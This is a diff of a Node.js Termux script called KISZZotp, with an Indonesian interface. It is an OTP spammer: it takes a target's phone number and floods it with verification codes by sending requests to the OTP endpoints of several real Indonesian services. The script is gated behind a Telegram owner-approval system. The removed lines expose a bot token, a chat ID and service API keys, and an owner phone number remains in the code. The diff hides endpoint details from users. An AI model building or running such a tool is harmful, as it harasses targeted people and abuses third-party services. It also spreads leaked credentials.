@@ -6,19 +6,15 @@ import fs from 'fs';
 import os from 'os';
 import crypto from 'crypto';
 
-// ============================================
-// 1. KONFIGURASI - GANTI INI!
-// ============================================
 const CONFIG = {
-    TELEGRAM_TOKEN: '8732611588:AAGshd8fghjklmnoPQRS',   // Token dari BotFather
-    TELEGRAM_CHAT_ID: '8276813899',                       // ID dari userinfobot
+    TELEGRAM_TOKEN: 'GANTI_DENGAN_TOKEN_BOTMU',
+    TELEGRAM_CHAT_ID: 'GANTI_DENGAN_CHAT_ID_MU',
     OWNER_NUMBER: '085168142675',
-    VERSION: '1.2.0'
+    VERSION: '1.2.1',
+    APPROVAL_TIMEOUT: 120,
+    POLL_INTERVAL: 5,
 };
 
-// ============================================
-// 2. FUNGSI UTILITY
-// ============================================
 const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
 function getTermuxId() {
@@ -45,9 +41,6 @@ function generateCode() {
     return crypto.randomInt(100000, 999999).toString();
 }
 
-// ============================================
-// 3. FUNGSI TELEGRAM (Kirim & Polling)
-// ============================================
 async function sendTelegramMessage(text) {
     try {
         const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/sendMessage`;
@@ -68,9 +61,6 @@ async function getTelegramUpdates(offset) {
     } catch { return []; }
 }
 
-// ============================================
-// 4. SISTEM APPROVAL
-// ============================================
 function isApproved(termuxId) {
     try {
         if (!fs.existsSync('approved.json')) return false;
@@ -102,23 +92,19 @@ async function requestApproval(userName, termuxId, device) {
 📱 Device: ${device}
 🔑 Kode: *${code}*
 
-Balas pesan ini dengan:
-\`/approve_${code}\` untuk izinkan
-\`/deny_${code}\` untuk tolak
+Balas dengan:
+\`/approve_${code}\` atau \`/deny_${code}\`
 
 ⏳ Berlaku ${CONFIG.APPROVAL_TIMEOUT} detik.`;
 
     console.log(chalk.yellow('\n⏳ Mengirim request approval ke owner...'));
     const sent = await sendTelegramMessage(msg);
     if (!sent) {
-        console.log(chalk.red('❌ Gagal mengirim request ke Telegram. Cek token & chat ID.'));
+        console.log(chalk.red('❌ Gagal kirim ke Telegram. Cek token & chat ID.'));
         process.exit(1);
     }
 
-    console.log(chalk.green('✅ Request terkirim! Menunggu approval dari owner...'));
-    console.log(chalk.gray(`   (maksimal ${CONFIG.APPROVAL_TIMEOUT} detik)`));
-
-    // Polling
+    console.log(chalk.green('✅ Request terkirim! Menunggu approval...'));
     let offset = 0;
     const startTime = Date.now();
     while ((Date.now() - startTime) / 1000 < CONFIG.APPROVAL_TIMEOUT) {
@@ -126,29 +112,22 @@ Balas pesan ini dengan:
         for (const update of updates) {
             offset = update.update_id + 1;
             const text = update.message?.text || '';
-            // Cek apakah dari chat owner
             if (update.message?.chat?.id == CONFIG.TELEGRAM_CHAT_ID) {
                 if (text.includes(`/approve_${code}`)) {
-                    console.log(chalk.green('\n✅ APPROVED oleh owner!'));
+                    console.log(chalk.green('\n✅ APPROVED!'));
                     saveApproved(termuxId);
                     return true;
                 } else if (text.includes(`/deny_${code}`)) {
-                    console.log(chalk.red('\n❌ Ditolak oleh owner.'));
+                    console.log(chalk.red('\n❌ Ditolak.'));
                     return false;
                 }
             }
         }
         await sleep(CONFIG.POLL_INTERVAL * 1000);
     }
-
-    console.log(chalk.red('\n⏰ Waktu habis! Tidak ada respon dari owner.'));
+    console.log(chalk.red('\n⏰ Waktu habis!'));
     return false;
 }
-
-// ============================================
-// 5. FUNGSI LAINNYA (Menu, Spammer, dll)
-// ============================================
-const sleep2 = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
 function getUserName() {
     let name = readlineSync.question(chalk.cyan('Masukkan nama Anda: '));
@@ -163,19 +142,16 @@ function getStatus(isOwner) {
 function showHeader(user, status, termuxId, device) {
     console.clear();
     console.log(chalk.cyan(`
-    ╔═══════════════════════════════════════════════╗
-    ║                                               ║
-    ║   ██╗  ██╗██╗███████╗███████╗███████╗       ║
-    ║   ██║ ██╔╝██║╚══███╔╝╚══███╔╝╚══███╔╝       ║
-    ║   █████╔╝ ██║  ███╔╝   ███╔╝   ███╔╝        ║
-    ║   ██╔═██╗ ██║ ███╔╝   ███╔╝   ███╔╝         ║
-    ║   ██║  ██╗██║███████╗███████╗███████╗       ║
-    ║   ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝       ║
-    ║                                               ║
-    ║         ${chalk.bold('KISZZotp v' + CONFIG.VERSION)}                     ║
-    ╚═══════════════════════════════════════════════╝
-    `));
-
+╔═══════════════════════════════════════════════╗
+║   ██╗  ██╗██╗███████╗███████╗███████╗       ║
+║   ██║ ██╔╝██║╚══███╔╝╚══███╔╝╚══███╔╝       ║
+║   █████╔╝ ██║  ███╔╝   ███╔╝   ███╔╝        ║
+║   ██╔═██╗ ██║ ███╔╝   ███╔╝   ███╔╝         ║
+║   ██║  ██╗██║███████╗███████╗███████╗       ║
+║   ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝       ║
+║         ${chalk.bold('KISZZotp v' + CONFIG.VERSION)}                     ║
+╚═══════════════════════════════════════════════╝
+`));
     console.log(chalk.white(`╔═══════════════════════════════════════════════╗`));
     console.log(chalk.white(`║ ${chalk.bold('👤 User')}   : ${chalk.green(user)}`));
     console.log(chalk.white(`║ ${chalk.bold('📊 Status')} : ${status}`));
@@ -190,22 +166,26 @@ function showMenu() {
     console.log(chalk.yellow(`╔═══════════════════════════════════════════════╗`));
     console.log(chalk.yellow(`║              📋  MENU UTAMA                  ║`));
     console.log(chalk.yellow(`╠═══════════════════════════════════════════════╣`));
-    console.log(chalk.yellow(`║ ${chalk.cyan('1.')} 🚀  Jalankan Spammer OTP         ║`));
-    console.log(chalk.yellow(`║ ${chalk.cyan('2.')} 🐛  Lapor Bug ke Owner           ║`));
-    console.log(chalk.yellow(`║ ${chalk.cyan('3.')} 🔄  Cek Update                 ║`));
+    console.log(chalk.yellow(`║ ${chalk.cyan('1.')} 🚀  Halaman Spammer OTP         ║`));
+    console.log(chalk.yellow(`║ ${chalk.cyan('2.')} 🐛  Halaman Lapor Bug           ║`));
+    console.log(chalk.yellow(`║ ${chalk.cyan('3.')} 🔄  Halaman Cek Update         ║`));
     console.log(chalk.yellow(`║ ${chalk.cyan('4.')} ❌  Keluar                     ║`));
     console.log(chalk.yellow(`╚═══════════════════════════════════════════════╝`));
     console.log();
 }
 
-async function runSpammer(user) {
+async function halamanSpammer(user) {
     console.clear();
-    console.log(chalk.cyan('🚀 MEMULAI SPAMMER OTP...\n'));
+    console.log(chalk.cyan(`
+╔═══════════════════════════════════════════════╗
+║         🚀  HALAMAN SPAMMER OTP              ║
+╚═══════════════════════════════════════════════╝
+`));
 
     const target = readlineSync.question(chalk.white('📱 Masukkan nomor target (contoh: 08123456789): '));
     if (!target.trim()) {
         console.log(chalk.red('❌ Nomor tidak boleh kosong!'));
-        await sleep2(1500);
+        readlineSync.question(chalk.gray('\nTekan Enter untuk kembali...'));
         return;
     }
 
@@ -217,17 +197,20 @@ async function runSpammer(user) {
     const p62 = phone;
 
     console.log(chalk.green(`✅ Target: ${phone}\n`));
+    console.log(chalk.gray('⏳ Mengirim OTP... (proses ini bisa makan waktu)\n'));
 
+    // ========== DAFTAR ENDPOINT (API Key sudah di-redact) ==========
     const otp = [
-        { url: "https://internetrakyat.id/api/app/auth/send-otp-register", data: { phone_number: p08 }, headers: { "x-api-key": "280999!FTTH" } },
+        { url: "https://internetrakyat.id/api/app/auth/send-otp-register", data: { phone_number: p08 }, headers: { "x-api-key": "REDACTED" } },
         { url: "https://www.alodokter.com/resend-otp", data: { user: { phone: p08, uuid: "f6bd0911---b189-" }, request_via: "whatsapp" } },
         { url: "https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp", data: { accountType: "customers", applicationType: "Pinhome Web", countryCode: "62", medium: "whatsapp", otpType: "register", phoneNumber: p62.replace("62", "") } },
         { url: "https://www.rumah123.com/api/otp/request-otp", data: { ipAddress: "36.67.110.51", phoneNumber: p62, portalId: 1, type: "WHATSAPP", url: "https://www.rumah123.com/user/login" }, headers: { "Base-Url-Core": "https://www.rumah123.com" } },
-        { url: "https://beta.api.saturdays.com/api/v1/user/otp/send", data: { number: p62.replace("62", ""), country_code: "+62", type: "" }, headers: { "x-api-key": "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj", "country-code": "ID" } },
+        { url: "https://beta.api.saturdays.com/api/v1/user/otp/send", data: { number: p62.replace("62", ""), country_code: "+62", type: "" }, headers: { "x-api-key": "REDACTED", "country-code": "ID" } },
         { url: "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata", data: { mobileNumber: p62.replace("62", ""), type: "prospect-create", channel: "whatsapp" } }
     ];
 
     let success = 0, failed = 0;
+    // Proses tanpa menampilkan detail endpoint
     for (let i = 0; i < otp.length; i++) {
         const ep = otp[i];
         try {
@@ -235,16 +218,17 @@ async function runSpammer(user) {
                 headers: { "Content-Type": "application/json", "User-Agent": "Mozilla/5.0", ...(ep.headers || {}) },
                 timeout: 10000
             };
-            console.log(`[${i+1}/${otp.length}] 🔄 ${ep.url}`);
+            // Tampilkan indikator sederhana (tanpa endpoint)
+            process.stdout.write(`[${i+1}/${otp.length}] 🔄 Mengirim... `);
             if (ep.method === "GET") await axios.get(ep.url, config);
             else await axios.post(ep.url, ep.data, config);
             success++;
-            console.log(`   ✅ Berhasil`);
+            console.log(chalk.green('✅ Berhasil'));
         } catch (e) {
             failed++;
-            console.log(`   ❌ Gagal - ${e.message}`);
+            console.log(chalk.red('❌ Gagal'));
         }
-        await sleep2(1000);
+        await sleep(1000);
     }
 
     console.log('\n========== LAPORAN ==========');
@@ -253,45 +237,52 @@ async function runSpammer(user) {
     console.log(`✅ Berhasil: ${success}`);
     console.log(`❌ Gagal: ${failed}`);
     console.log('===============================\n');
-    readlineSync.question(chalk.gray('\nTekan Enter untuk kembali ke menu...'));
+    readlineSync.question(chalk.gray('\nTekan Enter untuk kembali ke menu utama...'));
 }
 
-function reportBug(user) {
+function halamanLaporBug(user) {
     console.clear();
-    console.log(chalk.yellow('🐛 LAPOR BUG KE OWNER\n'));
+    console.log(chalk.yellow(`
+╔═══════════════════════════════════════════════╗
+║         🐛  HALAMAN LAPOR BUG               ║
+╚═══════════════════════════════════════════════╝
+`));
     console.log(chalk.white(`📱 Nomor Owner: ${CONFIG.OWNER_NUMBER}`));
+    console.log(chalk.gray('Kirim pesan ke WhatsApp dengan format:\n- Nama: [Nama Anda]\n- Bug: [Deskripsi bug]\n- Screenshot: [Opsional]\n'));
+
     const confirm = readlineSync.question(chalk.cyan('Buka WhatsApp sekarang? (y/n): '));
     if (confirm.toLowerCase() === 'y') {
-        const url = `https://wa.me/${CONFIG.OWNER_NUMBER}?text=Halo%20KISZZ%2C%20saya%20${encodeURIComponent(user)}%20ingin%20lapor%20bug.`;
+        const url = `https://wa.me/${CONFIG.OWNER_NUMBER}?text=Halo%20KISZZ%2C%20saya%20${encodeURIComponent(user)}%20ingin%20lapor%20bug.%0A%0ADeskripsi%3A%20`;
         execSync(`termux-open-url "${url}"`);
     }
-    readlineSync.question(chalk.gray('\nTekan Enter untuk kembali ke menu...'));
+    readlineSync.question(chalk.gray('\nTekan Enter untuk kembali ke menu utama...'));
 }
 
-async function checkUpdate(user) {
+async function halamanCekUpdate() {
     console.clear();
-    console.log(chalk.cyan('🔄 MENCARI UPDATE...\n'));
+    console.log(chalk.cyan(`
+╔═══════════════════════════════════════════════╗
+║         🔄  HALAMAN CEK UPDATE              ║
+╚═══════════════════════════════════════════════╝
+`));
     console.log(chalk.green(`✅ Versi terbaru: ${CONFIG.VERSION}`));
-    readlineSync.question(chalk.gray('\nTekan Enter untuk kembali...'));
+    console.log(chalk.gray('Anda sudah menggunakan versi terbaru.'));
+    readlineSync.question(chalk.gray('\nTekan Enter untuk kembali ke menu utama...'));
 }
 
-// ============================================
-// 6. MAIN PROGRAM
-// ============================================
 async function main() {
     console.clear();
     console.log(chalk.cyan(`
-    ╔═══════════════════════════════════════════════╗
-    ║     SELAMAT DATANG DI KISZZotp               ║
-    ╚═══════════════════════════════════════════════╝
-    `));
+╔═══════════════════════════════════════════════╗
+║     SELAMAT DATANG DI KISZZotp               ║
+╚═══════════════════════════════════════════════╝
+`));
 
     const userName = getUserName();
     const termuxId = getTermuxId();
     const device = getDeviceInfo();
     const isOwner = userName.toLowerCase() === 'kiszz';
 
-    // ===== SISTEM APPROVAL =====
     if (!isOwner) {
         if (!isApproved(termuxId)) {
             console.log(chalk.yellow('\n🔐 Script ini memerlukan approval dari owner.'));
@@ -302,12 +293,13 @@ async function main() {
             }
         } else {
             console.log(chalk.green('\n✅ Anda sudah terdaftar. Selamat datang kembali!'));
+            await sleep(1500);
         }
     } else {
         console.log(chalk.green('\n👑 Owner mode aktif. Tidak perlu approval.'));
+        await sleep(1500);
     }
 
-    // Menu utama
     while (true) {
         const status = getStatus(isOwner);
         showHeader(userName, status, termuxId, device);
@@ -316,15 +308,21 @@ async function main() {
         const choice = readlineSync.question(chalk.cyan('Pilih menu [1-4]: '));
 
         switch (choice) {
-            case '1': await runSpammer(userName); break;
-            case '2': reportBug(userName); break;
-            case '3': await checkUpdate(userName); break;
+            case '1':
+                await halamanSpammer(userName);
+                break;
+            case '2':
+                halamanLaporBug(userName);
+                break;
+            case '3':
+                await halamanCekUpdate();
+                break;
             case '4':
                 console.log(chalk.green('\n👋 Terima kasih telah menggunakan KISZZotp!'));
                 process.exit(0);
             default:
                 console.log(chalk.red('❌ Pilihan tidak valid!'));
-                await sleep2(1000);
+                await sleep(1000);
         }
     }
 }
